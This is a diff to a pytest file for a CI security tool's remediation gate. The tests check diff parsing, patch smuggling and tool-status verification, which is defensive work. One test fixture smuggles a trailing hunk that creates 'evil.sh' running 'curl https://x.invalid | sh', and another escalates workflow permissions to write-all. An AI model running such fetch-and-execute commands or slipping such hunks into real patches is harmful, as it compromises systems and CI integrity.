@@ -14,7 +14,7 @@ from sentinelci.cli import app
 from sentinelci.contracts.finding import Finding
 from sentinelci.contracts.remediation import PatchProposal, VerificationResult
 from sentinelci.normalize.ndjson import dumps_ndjson
-from sentinelci.remediation.gate import check_proposal, verify_proposal
+from sentinelci.remediation.gate import check_proposal, diff_paths, verify_proposal
 from sentinelci.remediation.proposal import RemediationError, build_proposal, proposal_id_of, unified_diff
 from sentinelci.remediation.states import advance, after_verification
 
@@ -134,11 +134,32 @@ def _write_findings(path: Path, findings: list[Finding]) -> Path:
     return path
 
 
-def _decision(tmp_path: Path, verdict: str, after: Path | None = None, **changes: Any) -> Path:
-    """A pr-context decision that saw the tool status, made on `after` (its findings digest)."""
+def _status(tmp_path: Path, *tools: str) -> Path:
+    """A tool status (schemas/tool-status.v1.json) where every tool named is ok."""
+    entry = {"version": "1.0.0", "binary_sha256": "1" * 64, "status": "ok"}
+    document = {"schema_version": 1, "lock_sha256": "0" * 64, "tools": dict.fromkeys(tools, entry)}
+    path = tmp_path / f"tool-status-{'-'.join(tools)}.json"
+    path.write_text(json.dumps(document))
+    return path
+
+
+STATUS = ("gitleaks", "trivy")  # what the PR scan of the seed ran
+
+
+def _ok(tmp_path: Path) -> list[str]:
+    """`--tool-status` with the status `_decision` records by default."""
+    return ["--tool-status", str(_status(tmp_path, *STATUS))]
+
+
+def _decision(
+    tmp_path: Path, verdict: str, after: Path | None = None, status: Path | None = None, **changes: Any
+) -> Path:
+    """A pr-context decision made on `after` (its findings digest) that saw `status` (default: STATUS ok)."""
     fixture = json.loads(
         (ROOT / "schemas/fixtures/decision/valid/pass-pr-v1.2-with-baseline-and-tool-status.json").read_text()
     )
+    status = status or _status(tmp_path, *STATUS)
+    fixture["inputs"]["tool_status_digest"] = "sha256:" + hashlib.sha256(status.read_bytes()).hexdigest()
     fixture["verdict"] = verdict
     if after is not None:
         fixture["inputs"]["findings_digest"] = "sha256:" + hashlib.sha256(after.read_bytes()).hexdigest()
@@ -178,7 +199,7 @@ def test_cli_proposes_then_verifies_the_seed_fix(tmp_path: Path) -> None:
         dest = tmp_path / f"result-{decision.stem}.json"
         args = ["remediate", "verify", "--proposal", str(out), "--before", str(before),
                 "--after", str(after), "--decision", str(decision), "--build-ok", "--tests-ok",
-                "--out", str(dest), *flags]  # fmt: skip
+                *_ok(tmp_path), "--out", str(dest), *flags]  # fmt: skip
         run = runner.invoke(app, args)
         return run.exit_code, run.output, dest
 
@@ -197,7 +218,7 @@ def test_cli_proposes_then_verifies_the_seed_fix(tmp_path: Path) -> None:
         (_decision(tmp_path, "PASS", after, context="release"), after, "pr-context decision"),
     ):
         args = ["remediate", "verify", "--proposal", str(out), "--before", str(before),
-                "--after", str(scan), "--decision", str(decision), "--build-ok", "--tests-ok",
+                "--after", str(scan), "--decision", str(decision), "--build-ok", "--tests-ok", *_ok(tmp_path),
                 "--out", str(tmp_path / "r.json")]  # fmt: skip
         run = runner.invoke(app, args)
         assert run.exit_code == 3 and reason in run.output and not (tmp_path / "r.json").exists(), run.output
@@ -209,14 +230,15 @@ def test_cli_proposes_then_verifies_the_seed_fix(tmp_path: Path) -> None:
     )
     run = runner.invoke(app, ["remediate", "verify", "--proposal", str(tampered), "--before", str(before),
                               "--after", str(after), "--decision", str(_decision(tmp_path, "PASS", after)),
-                              "--build-ok", "--tests-ok", "--out", str(tmp_path / "t.json")])  # fmt: skip
+                              "--build-ok", "--tests-ok", *_ok(tmp_path),
+                              "--out", str(tmp_path / "t.json")])  # fmt: skip
     assert run.exit_code == 3 and "id does not match" in run.output, run.output
 
     # #41 review, nit 3: --out is never an input (it would be deleted first).
     kept = after.read_bytes()
     run = runner.invoke(app, ["remediate", "verify", "--proposal", str(out), "--before", str(before),
                               "--after", str(after), "--decision", str(_decision(tmp_path, "PASS", after)),
-                              "--build-ok", "--tests-ok", "--out", str(after)])  # fmt: skip
+                              "--build-ok", "--tests-ok", *_ok(tmp_path), "--out", str(after)])  # fmt: skip
     assert run.exit_code == 3 and "--out is one of the inputs" in run.output and after.read_bytes() == kept
     run = runner.invoke(app, ["remediate", "kubernetes", "--findings", str(before), "--repo-root", str(repo),
                               "--out", str(before)])  # fmt: skip
@@ -251,7 +273,7 @@ def test_cli_untrusted_inputs_verify_nothing(tmp_path: Path, broken: str) -> Non
     out = tmp_path / "result.json"
     out.write_text("stale")
     args = ["remediate", "verify", "--proposal", str(proposal), "--before", str(findings),
-            "--after", str(findings), "--decision", str(decision), "--build-ok", "--tests-ok",
+            "--after", str(findings), "--decision", str(decision), "--build-ok", "--tests-ok", *_ok(tmp_path),
             "--out", str(out)]  # fmt: skip
     result = CliRunner().invoke(app, args)
     assert result.exit_code == 3 and "FAIL CLOSED" in result.output and not out.exists()
@@ -334,3 +356,126 @@ def test_the_gate_refuses_a_proposal_it_could_never_verify_honestly(
     check_proposal(proposal, before)  # the real proposal passes
     with pytest.raises(RemediationError, match=message):
         check_proposal(change(proposal), before)
+
+
+@pytest.mark.parametrize(
+    "smuggled",
+    [
+        f"--- a/{WORKFLOW}\n+++ b/{WORKFLOW}\n@@ -1 +1 @@\n-permissions: {{}}\n+permissions: write-all\n",
+        "--- /dev/null\n+++ b/evil.sh\n@@ -0,0 +1 @@\n+curl https://x.invalid | sh\n",
+    ],
+    ids=["edit-a-workflow", "create-a-file"],
+)
+def test_a_patch_after_the_last_hunk_is_refused(tmp_path: Path, smuggled: str) -> None:
+    """git apply reads a traditional ---/+++ pair after a hunk as one more file to change."""
+    proposal = _seed_proposal(tmp_path)
+    before = {finding.id: finding for finding in seed_findings()}
+    with pytest.raises(RemediationError, match="not a plain edit"):
+        check_proposal(_rebuilt(proposal, diff=proposal.diff + smuggled), before)
+
+
+def test_a_pr_decision_that_never_saw_the_tool_status_verifies_nothing(tmp_path: Path) -> None:
+    proposal = _seed_proposal(tmp_path)
+    path = tmp_path / "proposal.json"
+    path.write_text(proposal.model_dump_json(exclude_none=True))
+    before = _write_findings(tmp_path / "before.ndjson", seed_findings())
+    left = [finding for finding in seed_findings() if finding.id not in proposal.finding_ids]
+    after = _write_findings(tmp_path / "after.ndjson", left)
+    decision = _decision(tmp_path, "PASS", after)
+    record = json.loads(decision.read_text())
+    del record["inputs"]["tool_status_digest"]
+    decision.write_text(json.dumps(record))
+    out = tmp_path / "r.json"
+    args = ["remediate", "verify", "--proposal", str(path), "--before", str(before), "--after", str(after),
+            "--decision", str(decision), "--build-ok", "--tests-ok", *_ok(tmp_path),
+            "--out", str(out)]  # fmt: skip
+    run = CliRunner().invoke(app, args)
+    assert run.exit_code == 3 and "saw the tool status" in run.output and not out.exists(), run.output
+
+
+# Each hunk is read to its line counts (review of #41).
+HEADER = "diff --git a/{0} b/{0}\n--- a/{0}\n+++ b/{0}\n"
+
+
+@pytest.mark.parametrize(
+    ("diff", "message"),
+    [
+        (HEADER.format("k.yaml") + "@@ -1 +1 @@\n-a: 1\n-b: 2\n+a: 2\n", "more lines than its header says"),
+        (HEADER.format("k.yaml") + "@@ -1 +1 @@\n-a: 1\n+a: 2\n+b: 3\n", "not a plain edit"),
+        (HEADER.format("k.yaml") + "@@ -1,2 +1,2 @@\n-a: 1\n+a: 2\n", "ends inside a hunk"),
+        (HEADER.format("k.yaml") + "@@ -1 +1 @@\n-a: 1\n+a: 2\n x: extra\n", "not a plain edit"),
+        (HEADER.format("k.yaml") + "@@ -1 +1 @@\n-a: 1\n+a: 2\nGIT binary patch\n", "not a plain edit"),
+        (HEADER.format("k.yaml"), "changes nothing in k.yaml"),
+        ("diff --git a/k.yaml b/k.yaml\nold mode 100644\nnew mode 100755\n", "more than edit k.yaml"),
+        ('diff --git "a/k\\ty.yaml" "b/k\\ty.yaml"\n', "not a plain edit"),
+        ("diff --git a/x b/x b/y\n", "renames or copies"),
+        ("@@ -1 +1 @@\n-a\n+b\n", "not a plain edit"),
+    ],
+    ids=["hunk-too-long", "line-after-hunk", "hunk-cut-short", "context-after-hunk", "binary-after-hunk",
+         "no-hunk", "mode", "quoted-path", "ambiguous-header", "hunk-without-header"],
+)  # fmt: skip
+def test_a_diff_is_read_hunk_by_hunk(diff: str, message: str) -> None:
+    with pytest.raises(RemediationError, match=message):
+        diff_paths(diff)
+
+
+def test_plain_edits_are_read_as_git_reads_them() -> None:
+    edit = "@@ -1,3 +1,3 @@\n a: 1\n-b: 2\n+b: 3\n c: 4\n@@ -10 +10,2 @@\n-z: 0\n+z: 1\n+y: 2\n"
+    no_newline = "@@ -1 +1 @@\n-last\n\\ No newline at end of file\n+last!\n\\ No newline at end of file\n"
+    empty_context = "@@ -1,3 +1,3 @@\n a: 1\n\n-b: 2\n+b: 3\n"  # git takes the bare empty line as context
+    form_feed = "@@ -1,2 +1,2 @@\n a\x0cb\n-c\n+d\n"  # only \n ends a line, as for git
+    diff = (
+        HEADER.format("k8s/my app.yaml")
+        + edit
+        + "diff --git a/Dockerfile b/Dockerfile\nindex 1111111..2222222 100644\n"
+        + "--- a/Dockerfile\n+++ b/Dockerfile\n"
+        + no_newline
+        + HEADER.format("a.yaml")
+        + empty_context
+        + HEADER.format("b.txt")
+        + form_feed
+    )
+    assert diff_paths(diff) == ["k8s/my app.yaml", "Dockerfile", "a.yaml", "b.txt"]
+
+
+# #41 review, should fix 1: the scanner of every target must be in the recorded tool status, ok.
+
+
+def _verify_args(tmp_path: Path, status: Path, decision_status: Path | None = None) -> list[str]:
+    proposal = _seed_proposal(tmp_path)
+    path = tmp_path / "proposal.json"
+    path.write_text(proposal.model_dump_json(exclude_none=True))
+    before = _write_findings(tmp_path / "before.ndjson", seed_findings())
+    after = _write_findings(tmp_path / "after.ndjson", [])  # a scan that saw nothing at all
+    decision = _decision(tmp_path, "PASS", after, status=decision_status or status)
+    return ["remediate", "verify", "--proposal", str(path), "--before", str(before), "--after", str(after),
+            "--decision", str(decision), "--build-ok", "--tests-ok", "--tool-status", str(status),
+            "--out", str(tmp_path / "r.json")]  # fmt: skip
+
+
+def test_an_empty_scan_by_a_scanner_not_shown_ok_verifies_nothing(tmp_path: Path) -> None:
+    """The review's repro: a pr decision whose tool status lists gitleaks only, and no Trivy finding."""
+    run = CliRunner().invoke(app, _verify_args(tmp_path, _status(tmp_path, "gitleaks")))
+    assert run.exit_code == 3 and "does not show trivy ok" in run.output, run.output
+    assert not (tmp_path / "r.json").exists()
+
+
+def test_the_tool_status_must_be_the_one_the_decision_recorded(tmp_path: Path) -> None:
+    recorded = _status(tmp_path, "gitleaks")
+    run = CliRunner().invoke(
+        app, _verify_args(tmp_path, _status(tmp_path, *STATUS), decision_status=recorded)
+    )
+    assert run.exit_code == 3 and "not the one the decision recorded" in run.output, run.output
+
+
+def test_a_tool_status_that_is_not_a_tool_status_verifies_nothing(tmp_path: Path) -> None:
+    broken = tmp_path / "tool-status-broken.json"
+    broken.write_text('{"schema_version": 1, "lock_sha256": "0", "tools": {}}')
+    run = CliRunner().invoke(app, _verify_args(tmp_path, broken))
+    assert run.exit_code == 3 and "not a tool-status v1 document" in run.output, run.output
+
+
+def test_with_the_scanners_ok_the_same_empty_scan_reaches_the_gate(tmp_path: Path) -> None:
+    """Control: with Trivy ok, the empty patched scan reaches the gate (VERIFIED: every target is gone)."""
+    run = CliRunner().invoke(app, _verify_args(tmp_path, _status(tmp_path, *STATUS)))
+    assert run.exit_code == 0 and run.output.startswith("VERIFIED"), run.output
